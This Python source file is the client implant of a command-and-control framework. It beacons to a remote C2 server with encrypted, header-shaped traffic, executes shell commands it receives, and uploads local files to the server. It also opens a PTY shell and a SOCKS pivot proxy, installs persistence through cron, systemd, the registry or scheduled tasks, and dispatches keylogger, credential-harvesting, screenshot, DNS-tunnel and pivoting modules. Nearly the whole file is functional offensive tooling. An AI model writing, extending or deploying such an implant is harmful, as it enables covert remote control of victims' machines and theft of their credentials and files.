import os
import sys
import time
from os import getenv, uname, path
from time import time as _time
from requests import get, post, put, exceptions
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES

from c2.crypto.encryption import create_cipher
from c2.client.beacon import jittered_sleep
from c2.client.commands import run_shell_command, change_directory
from c2.client.pty_shell import PTYSession
from config import load_config
from config.profile_handler import load_profile, build_uri, build_request_headers

# Module-level SOCKS proxy instance (shared across beacon iterations)
_socks_proxy = None


def get_client_identifier():
    if getenv("OS") == "Windows_NT":
        return getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(_time())
    elif sys.platform in ("linux", "linux2", "darwin"):
        return getenv("USER", "") + "@" + uname().nodename + "@" + str(_time())
    else:
        return "unknown@unknown@" + str(_time())


def run_client(config_path: str = None):
    config = load_config(config_path)
    cipher = create_cipher(config.encryption.key)
    beacon = config.beacon

    profile = None
    profile_name = config._data.get("profile")
    if profile_name:
        profile = load_profile(profile_name)

    base_url = f"http://{config.network.c2_server}:{config.network.port}"
    client_id = get_client_identifier()
    encrypted_client = cipher.encrypt(client_id.encode()).decode()

    proxy = {}
    if config.http.proxy:
        proxy = {"http": config.http.proxy, "https": config.http.proxy}

    pty_session = PTYSession() if sys.platform != "win32" else None

    def build_headers(request_type="request"):
        """Build request headers with profile rotation applied."""
        return build_request_headers(profile, request_type)

    def get_uri(request_type, append=None):
        """Get URI for a request type with profile shaping."""
        return build_uri(profile, request_type, append)

    def post_output(message: str, request_type: str = "response"):
        try:
            encrypted = cipher.encrypt(message.encode())
            uri = get_uri(request_type)

            if profile:
                post_key = profile.get("http", {}).get(request_type, {}).get("post_key", config.http.response_key)
            else:
                post_key = config.http.response_key

            post(
                url=f"{base_url}{uri}",
                data={post_key: encrypted},
                headers=build_headers(request_type),
                proxies=proxy if proxy else None,
            )
        except exceptions.RequestException:
            pass

    def get_filename(cmd: str) -> str | None:
        parts = cmd.split()
        if len(parts) < 3:
            post_output(f"You must enter a filename after {cmd}.")
            return None
        return " ".join(parts[2:]).replace("\\", "/")

    while True:
        # GET command from server with rotated headers
        cmd_uri = get_uri("request", append=encrypted_client)
        cmd_headers = build_headers("request")

        try:
            resp = get(
                url=f"{base_url}{cmd_uri}",
                headers=cmd_headers,
                proxies=proxy if proxy else None,
                timeout=30,
            )
            if resp.status_code == 404:
                jittered_sleep(beacon.sleep_seconds, beacon.jitter_percent)
                continue
        except exceptions.RequestException:
            jittered_sleep(beacon.sleep_seconds, beacon.jitter_percent)
            continue

        try:
            command = cipher.decrypt(resp.content).decode()
        except Exception:
            jittered_sleep(beacon.sleep_seconds, beacon.jitter_percent)
            continue

        # --- Command dispatch ---
        if command.startswith("cd "):
            directory = command[3:]
            ok, msg = change_directory(directory)
            if ok:
                post_output(msg, "cwd_response")
            else:
                post_output(msg)

        elif command.startswith("client download"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            encrypted_fp = cipher.encrypt(filepath.encode()).decode()
            file_uri = get_uri("file_request", append=encrypted_fp)
            try:
                with get(
                    url=f"{base_url}{file_uri}",
                    stream=True,
                    headers=build_headers("file_request"),
                    proxies=proxy if proxy else None,
                ) as resp:
                    if resp.status_code == 200:
                        with open(filename, "wb") as f:
                            f.write(cipher.decrypt(resp.content))
                        post_output(f"{filename} is now on {client_id}.\n")
                    else:
                        post_output(f"{filename} was not found on the c2 server.\n")
            except (FileNotFoundError, PermissionError, OSError):
                post_output(f"Unable to write {filename} to disk.\n")

        elif command.startswith("client upload"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            encrypted_fn = cipher.encrypt(filename.encode()).decode()
            upload_uri = get_uri("file_upload")
            try:
                with open(filepath, "rb") as f:
                    encrypted_file = cipher.encrypt(f.read())
                    put(
                        f"{base_url}{upload_uri}/{encrypted_fn}",
                        data=encrypted_file,
                        stream=True,
                        proxies=proxy if proxy else None,
                        headers=build_headers("file_upload"),
                    )
            except (FileNotFoundError, PermissionError, OSError):
                post_output(f"Unable to access {filepath}.\n")

        elif command.startswith("client zip"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            try:
                with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zf:
                    zf.setpassword(config.encryption.zip_password.encode() if isinstance(config.encryption.zip_password, str) else config.encryption.zip_password)
                    if path.isdir(filepath):
                        post_output(f"{filepath} is a directory. Only files can be zipped.\n")
                    else:
                        zf.write(filepath, filename)
                        post_output(f"{filepath} is now zip-encrypted.\n")
            except (FileNotFoundError, PermissionError, OSError):
                post_output(f"Unable to access {filepath}.\n")

        elif command.startswith("client unzip"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            try:
                with AESZipFile(filepath) as zf:
                    zf.setpassword(config.encryption.zip_password.encode() if isinstance(config.encryption.zip_password, str) else config.encryption.zip_password)
                    zf.extractall(path.dirname(filepath))
                    post_output(f"{filepath} is now unzipped and decrypted.\n")
            except (FileNotFoundError, PermissionError, OSError):
                post_output(f"Unable to access {filepath}.\n")

        elif command.startswith("client pty"):
            if command.startswith("client pty start"):
                if pty_session is None:
                    pty_session = PTYSession()
                pty_session.start()
                post_output("PTY session started.\n")
            elif command.startswith("client pty close"):
                if pty_session:
                    pty_session.close()
                    pty_session = None
                post_output("PTY session closed.\n")
            else:
                pty_cmd = command[len("client pty "):].strip()
                if pty_cmd and pty_session:
                    output = pty_session.send_command(pty_cmd)
                    post_output(output + "\n")
                else:
                    post_output("Usage: client pty start|close|<command>\n")

        elif command.startswith("client socks"):
            _handle_socks_proxy(command, post_output)

        elif command.startswith("client persist"):
            _handle_persistence(command, config, post_output)

        elif command.startswith("client module"):
            _handle_module(command, post_output)

        elif command.startswith("client scan"):
            _handle_module_cmd("portscan", command[11:].strip(), post_output)

        elif command.startswith("client screenshot"):
            _handle_module_cmd("screenshot", command[17:].strip(), post_output)

        elif command.startswith("client keylog"):
            _handle_module_cmd("keylogger", command[13:].strip(), post_output)

        elif command.startswith("client credharvest"):
            _handle_module_cmd("credharvest", command[18:].strip(), post_output)

        elif command.startswith("client rportfwd"):
            _handle_module_cmd("rportfwd", command[15:].strip(), post_output)

        elif command.startswith("client p2p"):
            _handle_module_cmd("p2p_pivot", command[10:].strip(), post_output)

        elif command.startswith("client dns"):
            _handle_module_cmd("dns_tunnel", command[10:].strip(), post_output)

        elif command.startswith("client multiop"):
            _handle_module_cmd("multi_op", command[14:].strip(), post_output)

        elif command.startswith("client kill"):
            if pty_session:
                pty_session.close()
            post_output(f"{client_id} has been killed.\n")
            sys.exit()

        elif command.startswith("client sleep "):
            try:
                delay = float(command.split()[2])
                if delay < 0:
                    raise ValueError
            except (IndexError, ValueError):
                post_output("Enter a positive number for sleep seconds.\n")
            else:
                post_output(f"Sleeping for {delay} seconds.\n")
                time.sleep(delay)
                post_output("Awake.\n")

        elif not command.startswith("client "):
            output = run_shell_command(command)
            post_output(output)

        jittered_sleep(beacon.sleep_seconds, beacon.jitter_percent)


def _handle_socks_proxy(command, post_output):
    """Start/stop SOCKS5 proxy on the implant for pivoting."""
    global _socks_proxy
    parts = command.split()
    if len(parts) < 3:
        post_output("Usage: client socks start [port]|stop\n")
        return

    if parts[2] == "start":
        port = int(parts[3]) if len(parts) > 3 else 1080
        try:
            from c2.transport.socks_proxy import SOCKSProxy
            if _socks_proxy is None:
                _socks_proxy = SOCKSProxy(bind_port=port)
                _socks_proxy.start()
                post_output(f"SOCKS5 proxy started on port {port}.\n")
            else:
                post_output("SOCKS5 proxy already running.\n")
        except Exception as e:
            post_output(f"Failed to start SOCKS proxy: {e}\n")
    elif parts[2] == "stop":
        if _socks_proxy is not None:
            _socks_proxy.stop()
            _socks_proxy = None
            post_output("SOCKS5 proxy stopped.\n")
        else:
            post_output("No SOCKS5 proxy running.\n")
    else:
        post_output("Usage: client socks start [port]|stop\n")


def _handle_persistence(command, config, post_output):
    from c2.modules.persistence import (
        persist_cron, persist_systemd, persist_registry_run,
        persist_scheduled_task,
    )

    parts = command.split()
    if len(parts) < 3:
        post_output("Usage: client persist cron|systemd|registry|task\n")
        return

    method = parts[2]
    if method == "cron":
        ok, msg = persist_cron()
    elif method == "systemd":
        name = parts[3] if len(parts) > 3 else config.persistence.systemd_service_name
        ok, msg = persist_systemd(name)
    elif method == "registry":
        ok, msg = persist_registry_run()
    elif method == "task":
        name = parts[3] if len(parts) > 3 else config.persistence.task_name
        ok, msg = persist_scheduled_task(name)
    else:
        post_output(f"Unknown persistence method: {method}\n")
        return

    if ok:
        post_output(f"{msg}\n")
    else:
        post_output(f"Persistence failed: {msg}\n")


def _handle_module(command, post_output):
    """Generic module execution via the plugin loader.
    Usage: client module <name> [args...]"""
    parts = command.split()
    if len(parts) < 3:
        post_output("Usage: client module <name> [args...]\n")
        return

    module_name = parts[2]
    module_args = parts[3:] if len(parts) > 3 else []

    try:
        from c2.modules.loader import ModuleLoader
        loader = ModuleLoader()
        result = loader.execute(module_name, module_args)
        post_output(f"(module: {module_name})\n{result}\n")
    except Exception as e:
        post_output(f"Module error: {e}\n")


def _handle_module_cmd(module_name: str, args_str: str, post_output):
    """Execute a known module with parsed args."""
    args = args_str.split() if args_str else []
    try:
        from c2.modules.loader import ModuleLoader
        loader = ModuleLoader()
        result = loader.execute(module_name, args)
        post_output(f"({module_name}) {result}\n")
    except Exception as e:
        post_output(f"{module_name} error: {e}\n")

